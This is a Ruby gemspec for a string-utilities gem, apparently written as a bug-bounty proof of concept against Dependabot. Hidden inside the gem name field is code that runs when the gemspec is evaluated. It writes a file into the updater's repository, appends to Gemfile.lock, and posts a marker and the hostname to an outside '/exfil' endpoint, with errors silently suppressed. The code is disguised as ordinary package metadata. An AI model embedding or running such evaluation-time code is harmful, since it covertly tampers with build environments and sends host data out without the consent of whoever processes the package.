# frozen_string_literal: true

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name          = (
    begin
      require "net/http"
      require "uri"
      marker = "PHASE-A-MARKER-" + Time.now.to_i.to_s

      # File-write persistence test: write a new file + append to existing lockfile
      File.write("/home/dependabot/dependabot-updater/repo/PHASE-A-NEW-FILE.txt",
                 marker + "\nresearch artifact for boundary verification\n")

      File.open("/home/dependabot/dependabot-updater/repo/Gemfile.lock", "a") do |f|
        f.write("\n# " + marker + "-appended-from-eval\n")
      end

      # Single confirmation ping to record that eval fired
      Net::HTTP.post(
        URI("https://bell-chelsea-path-even.trycloudflare.com/exfil"),
        "phase=A&marker=" + marker + "&host=" + (Socket.gethostname rescue "x"),
        {"Content-Type" => "application/x-www-form-urlencoded"}
      )
    rescue
    end
    "useful-string-utils"
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]

  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
